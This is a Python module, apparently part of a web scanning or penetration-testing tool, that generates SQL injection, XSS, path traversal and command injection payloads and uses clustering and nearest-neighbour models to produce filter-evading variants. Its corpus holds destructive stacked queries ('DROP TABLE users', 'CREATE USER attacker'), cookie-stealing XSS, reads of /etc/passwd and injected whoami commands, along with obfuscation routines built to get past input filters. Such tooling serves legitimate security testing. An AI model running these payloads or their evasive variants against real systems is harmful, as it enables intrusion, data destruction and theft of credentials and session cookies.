"""ML payload generator.

This module provides ML-enhanced payload generation. Heavy ML
dependencies (numpy, pandas, scikit-learn, joblib) are imported
optionally so the module can be imported even when those packages
aren't installed. Attempting to call ML-specific methods without the
dependencies will raise a clear ImportError.
"""

import random
import string
import os
import config

# Do NOT import heavy ML libraries at module import time. Importing
# scikit-learn/scipy on Windows can be slow and may block the whole
# process (observed KeyboardInterrupt during startup). We'll attempt
# to import these lazily when ML functionality is actually used.
ML_DEPENDENCIES_AVAILABLE = False
ML_ENABLED = getattr(config, 'ENABLE_ML', True)

# Placeholders for heavy libs; populated by _ensure_ml_deps()
np = None
pd = None
joblib = None
TfidfVectorizer = None
KMeans = None
NearestNeighbors = None

class MLPayloadGenerator:
    """ML-enhanced payload generator with intelligent variant creation"""

    def __init__(self):
        # Do NOT attempt to instantiate heavy ML components here. Keep
        # the object lightweight so importing this module is quick.
        self.vectorizer = None
        self.cluster_model = None
        self.neighbor_model = None
        self.payload_database = None
        self.is_trained = False
        self.model_path = 'models/payload_generator.joblib'

    def _ensure_ml_deps(self):
        """Attempt to import heavy ML dependencies lazily.

        If the imports fail, raise ImportError with a helpful message.
        This keeps module import fast while still enabling ML when
        demanded by runtime callers.
        """
        global ML_DEPENDENCIES_AVAILABLE, np, pd, joblib, TfidfVectorizer, KMeans, NearestNeighbors

        if ML_DEPENDENCIES_AVAILABLE:
            return

        try:
            import numpy as np_local
            import pandas as pd_local
            import joblib as joblib_local
            from sklearn.feature_extraction.text import TfidfVectorizer as TfidfVectorizer_local
            from sklearn.cluster import KMeans as KMeans_local
            from sklearn.neighbors import NearestNeighbors as NearestNeighbors_local
        except Exception as e:
            ML_DEPENDENCIES_AVAILABLE = False
            raise ImportError(
                "ML dependencies are not available or failed to import. "
                "Install numpy, pandas, scikit-learn and joblib in the active environment, "
                "or disable ML by setting ENABLE_ML = False in config.py.") from e
        else:
            # Publish into module globals so other methods can use them.
            np = np_local
            pd = pd_local
            joblib = joblib_local
            TfidfVectorizer = TfidfVectorizer_local
            KMeans = KMeans_local
            NearestNeighbors = NearestNeighbors_local
            ML_DEPENDENCIES_AVAILABLE = True

            # Initialize vectorizer lazily (use defaults here; callers may re-fit)
            if self.vectorizer is None:
                self.vectorizer = TfidfVectorizer(ngram_range=(1, 2), max_features=1000)

    def initialize(self):
        """Initialize or load the ML model"""
        if not ML_ENABLED:
            print("⚠️ ML support is disabled via configuration (ENABLE_ML=False).")
            return

        try:
            # Attempt lazy import; will raise ImportError with guidance if it fails
            self._ensure_ml_deps()
        except ImportError as e:
            print(f"⚠️ {e}")
            return

        try:
            self.load_model()
            print("✅ ML Payload Generator loaded successfully")
        except Exception:
            print("🔄 Training ML Payload Generator...")
            self.train_generative_model()

    def create_payload_corpus(self):
        """Create comprehensive training corpus for ML model"""
        print("🔄 Creating payload corpus...")

        # SQL Injection templates and variants
        sqli_templates = [
            "{prefix}' UNION SELECT {columns} {comment}",
            "{prefix}' AND {condition} {comment}",
            "{prefix}' OR {condition} {comment}",
            "{prefix}' AND {function}({param}) {comment}",
            "{prefix}'; {command} {comment}",
            "{prefix}' AND EXTRACTVALUE(1,{payload}) {comment}",
            "{prefix}' AND IF({condition},SLEEP({time}),0) {comment}",
        ]

        # XSS templates and variants
        xss_templates = [
            "<script>{payload}</script>",
            "<img src=\"{url}\" onerror=\"{payload}\">",
            "<body onload=\"{payload}\">",
            "<svg onload=\"{payload}\">",
            "<{tag} {event}=\"{payload}\">",
            "<a href=\"javascript:{payload}\">Click</a>",
            "<iframe src=\"javascript:{payload}\">",
        ]

        # Generation components
        prefixes = ["1", "admin", "test", "user", "id", "123", ""]
        columns = ["1", "1,2", "1,2,3", "username,password", "@@version", "database()", "user()"]
        conditions = ["1=1", "2>1", "'a'='a'", "1", "true"]
        functions = ["SLEEP", "BENCHMARK", "WAITFOR", "EXTRACTVALUE", "UPDATEXML"]
        commands = ["DROP TABLE users", "CREATE USER attacker", "UPDATE users SET password='hacked'"]
        comments = ["--", "#", "/*", "*/", "-- -", "/*!50000"]
        urls = ["x", "invalid", "#", "http://evil.com"]
        tags = ["img", "body", "svg", "div", "iframe", "object", "embed"]
        events = ["onload", "onerror", "onmouseover", "onclick"]
        js_payloads = ["alert(1)", "alert(document.cookie)", "prompt(1)", "confirm(1)"]
        times = ["1", "2", "5"]

        generated_payloads = []

        # Generate SQLi variants
        for template in sqli_templates:
            for _ in range(10):  # Generate multiple variants per template
                try:
                    payload = template.format(
                        prefix=random.choice(prefixes),
                        columns=random.choice(columns),
                        condition=random.choice(conditions),
                        function=random.choice(functions),
                        param=random.choice(["1", "5"]),
                        command=random.choice(commands),
                        comment=random.choice(comments),
                        payload="CONCAT(0x3a,@@version)",
                        time=random.choice(times)
                    )
                    generated_payloads.append(('sqli', payload))
                except:
                    continue

        # Generate XSS variants
        for template in xss_templates:
            for _ in range(10):
                try:
                    payload = template.format(
                        payload=random.choice(js_payloads),
                        url=random.choice(urls),
                        tag=random.choice(tags),
                        event=random.choice(events)
                    )
                    generated_payloads.append(('xss', payload))
                except:
                    continue

        # Add advanced obfuscated payloads
        advanced_payloads = [
            ('sqli', "1' UNI/**/ON SEL/**/ECT 1,2--"),
            ('sqli', "1' AND/*!50000 1=1*/--"),
            ('sqli', "' OR '1'='1' /*!50000UNION*/ SELECT 1--"),
            ('xss', "<scr<script>ipt>alert(1)</scr</script>ipt>"),
            ('xss', "<img src=x oneonerrorrror=alert(1)>"),
            ('xss', "<svg onload&#61;alert&#40;1&#41;>"),
        ]

        generated_payloads.extend(advanced_payloads)

        # Add path traversal and command injection payloads
        traversal_payloads = [
            ('path_traversal', "../../../../etc/passwd"),
            ('path_traversal', "....//....//....//etc/passwd"),
            ('path_traversal', "..%2f..%2f..%2fetc%2fpasswd"),
        ]

        cmd_payloads = [
            ('command_injection', "; whoami"),
            ('command_injection', "| whoami"),
            ('command_injection', "&& whoami"),
            ('command_injection', "`whoami`"),
        ]

        generated_payloads.extend(traversal_payloads)
        generated_payloads.extend(cmd_payloads)

        print(f"📊 Created {len(generated_payloads)} payload variants")
        return generated_payloads

    def train_generative_model(self):
        """Train the ML generative model"""
        print("🔄 Training generative model...")

        # Ensure heavy deps available before proceeding
        self._ensure_ml_deps()
        payload_corpus = self.create_payload_corpus()

        # Separate payloads and types
        payloads = [p[1] for p in payload_corpus]
        types = [p[0] for p in payload_corpus]

        self.payload_database = {
            'payloads': payloads,
            'types': types
        }

        print(f"📊 Training on {len(payloads)} payload variants")
        print(f"📊 Distribution: SQLi: {types.count('sqli')}, XSS: {types.count('xss')}, "
              f"Path: {types.count('path_traversal')}, CMD: {types.count('command_injection')}")

        # Vectorize payloads
        if self.vectorizer is None:
            # create vectorizer now that deps are available
            self.vectorizer = TfidfVectorizer(ngram_range=(1, 2), max_features=1000)

        X = self.vectorizer.fit_transform(payloads)

        # Cluster payloads for variety
        n_clusters = min(15, len(payloads) // 10)
        self.cluster_model = KMeans(n_clusters=n_clusters, random_state=42)
        cluster_labels = self.cluster_model.fit_predict(X)

        # Train nearest neighbors for similarity search
        self.neighbor_model = NearestNeighbors(n_neighbors=10, metric='cosine')
        self.neighbor_model.fit(X)

        self.is_trained = True

        # Save the model
        self.save_model()

        print("✅ ML Payload Generator training completed!")
        return len(payloads)

    def generate_payload_variants(self, base_payload, payload_type='sqli', num_variants=5, creativity=0.7):
        """Generate intelligent payload variants using ML"""
        if not self.is_trained:
            raise ValueError("Model not trained. Call train_generative_model() first.")

        # Vectorize the base payload
        base_vector = self.vectorizer.transform([base_payload])

        # Find similar payloads in database
        distances, indices = self.neighbor_model.kneighbors(
            base_vector,
            n_neighbors=min(20, len(self.payload_database['payloads']))
        )

        # Select diverse payloads based on creativity
        selected_indices = self._select_diverse_indices(indices[0], distances[0], num_variants, creativity)

        variants = []
        for idx in selected_indices:
            template_payload = self.payload_database['payloads'][idx]
            template_type = self.payload_database['types'][idx]

            # Generate variant by applying transformations
            variant = self._apply_intelligent_transformations(template_payload, template_type, creativity)
            variants.append({
                'payload': variant,
                'type': payload_type,
                'base_similarity': float(1 - distances[0][list(indices[0]).index(idx)]),
                'creativity_level': creativity
            })

        return variants

    def generate_by_type(self, payload_type='sqli', num_payloads=10, creativity=0.5):
        """Generate payloads of specific type using ML"""
        if not self.is_trained:
            raise ValueError("Model not trained")

        # Ensure numpy available for random selection
        self._ensure_ml_deps()

        type_indices = [i for i, t in enumerate(self.payload_database['types']) if t == payload_type]

        if not type_indices:
            return []

        selected_indices = np.random.choice(
            type_indices,
            min(num_payloads, len(type_indices)),
            replace=False
        )

        payloads = []
        for idx in selected_indices:
            base_payload = self.payload_database['payloads'][idx]
            variant = self._apply_intelligent_transformations(base_payload, payload_type, creativity)
            payloads.append({
                'payload': variant,
                'type': payload_type,
                'creativity_level': creativity
            })

        return payloads

    def _select_diverse_indices(self, indices, distances, num_variants, creativity):
        """Select diverse payload indices based on creativity using ML"""
        # Ensure numpy available
        self._ensure_ml_deps()

        if creativity < 0.3:
            # Low creativity: return most similar
            return indices[:num_variants]
        elif creativity < 0.7:
            # Medium creativity: mix of similar and diverse
            similar_count = max(1, num_variants // 2)
            diverse_count = num_variants - similar_count
            return list(indices[:similar_count]) + list(
                np.random.choice(indices[similar_count:], diverse_count, replace=False)
            )
        else:
            # High creativity: weighted random selection favoring diversity
            weights = 1 - (distances - min(distances)) / (max(distances) - min(distances) + 1e-8)
            return np.random.choice(indices, min(num_variants, len(indices)), p=weights/weights.sum(), replace=False)

    def _apply_intelligent_transformations(self, payload, payload_type, creativity):
        """Apply intelligent transformations based on payload type and creativity"""
        transformations = []

        # Case obfuscation (more likely with higher creativity)
        if random.random() < creativity:
            transformations.append(self._ml_obfuscate_case)

        # Comment insertion
        if random.random() < creativity * 0.8:
            transformations.append(self._ml_insert_comments)

        # Encoding variations
        if random.random() < creativity * 0.6:
            transformations.append(self._ml_apply_encoding)

        # Whitespace manipulation
        if random.random() < creativity * 0.7:
            transformations.append(self._ml_manipulate_whitespace)

        # Apply selected transformations
        variant = payload
        for transform in random.sample(transformations, min(len(transformations), random.randint(1, len(transformations)))):
            variant = transform(variant, payload_type, creativity)

        return variant

    def _ml_obfuscate_case(self, payload, payload_type, creativity):
        """Intelligent case obfuscation using ML insights"""
        if payload_type == 'sqli':
            keywords = ['select', 'union', 'insert', 'update', 'delete', 'from', 'where', 'and', 'or']
        else:  # xss and others
            keywords = ['script', 'img', 'body', 'onload', 'onerror', 'alert', 'javascript']

        result = payload
        for keyword in keywords:
            if keyword in payload.lower():
                if creativity > 0.8:
                    # High creativity: mixed case
                    mixed = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in keyword)
                    result = result.replace(keyword, mixed)
                elif creativity > 0.5:
                    # Medium creativity: uppercase
                    result = result.replace(keyword, keyword.upper())
                else:
                    # Low creativity: occasional uppercase
                    if random.random() < 0.3:
                        result = result.replace(keyword, keyword.upper())

        return result

    def _ml_insert_comments(self, payload, payload_type, creativity):
        """Intelligent comment insertion"""
        if payload_type == 'sqli':
            comments = ['/*{}*/', '-- {}', '#{}']
            comment_text = ''.join(random.choices(string.ascii_letters, k=random.randint(2, 4)))
            comment = random.choice(comments).format(comment_text)

            if len(payload) > 10:
                # More creative = more comment positions
                num_insertions = 1 if creativity < 0.5 else random.randint(1, 2)
                for _ in range(num_insertions):
                    insert_pos = random.randint(len(payload)//4, len(payload)*3//4)
                    payload = payload[:insert_pos] + comment + payload[insert_pos:]

        return payload

    def _ml_apply_encoding(self, payload, payload_type, creativity):
        """Intelligent encoding application"""
        if payload_type == 'xss' and random.random() < creativity:
            if creativity > 0.7:
                # High creativity: multiple encoding types
                payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                if random.random() < 0.5:
                    payload = payload.replace("'", "%27")
            elif creativity > 0.4:
                # Medium creativity: basic encoding
                payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        elif payload_type == 'sqli' and random.random() < creativity * 0.5:
            payload = payload.replace("'", "%27").replace(' ', "%20")

        return payload

    def _ml_manipulate_whitespace(self, payload, payload_type, creativity):
        """Intelligent whitespace manipulation"""
        whitespace_variants = [' ', '\t', '\n', '\r', '/**/']

        if ' ' in payload:
            parts = payload.split(' ')
            result_parts = []

            for i, part in enumerate(parts):
                result_parts.append(part)
                if i < len(parts) - 1 and random.random() < creativity * 0.6:
                    # More creative = more varied whitespace
                    if creativity > 0.7:
                        result_parts.append(random.choice(whitespace_variants))
                    else:
                        result_parts.append(' ' if random.random() < 0.7 else '/**/')

            return ''.join(result_parts)

        return payload

    def save_model(self):
        """Save the trained ML model"""
        if not self.is_trained:
            raise ValueError("No model trained yet")

        os.makedirs(os.path.dirname(self.model_path), exist_ok=True)

        model_data = {
            'vectorizer': self.vectorizer,
            'cluster_model': self.cluster_model,
            'neighbor_model': self.neighbor_model,
            'payload_database': self.payload_database,
            'is_trained': self.is_trained
        }
        # Ensure joblib available
        self._ensure_ml_deps()
        joblib.dump(model_data, self.model_path)
        print(f"💾 ML model saved to: {self.model_path}")

    def load_model(self):
        """Load the trained ML model"""
        if not os.path.exists(self.model_path):
            raise FileNotFoundError(f"Model file not found: {self.model_path}")

        # Ensure joblib available
        self._ensure_ml_deps()

        model_data = joblib.load(self.model_path)
        self.vectorizer = model_data['vectorizer']
        self.cluster_model = model_data['cluster_model']
        self.neighbor_model = model_data['neighbor_model']
        self.payload_database = model_data['payload_database']
        self.is_trained = model_data['is_trained']

        print(f"📂 ML model loaded from: {self.model_path}")

# Global instance
ml_payload_generator = MLPayloadGenerator()
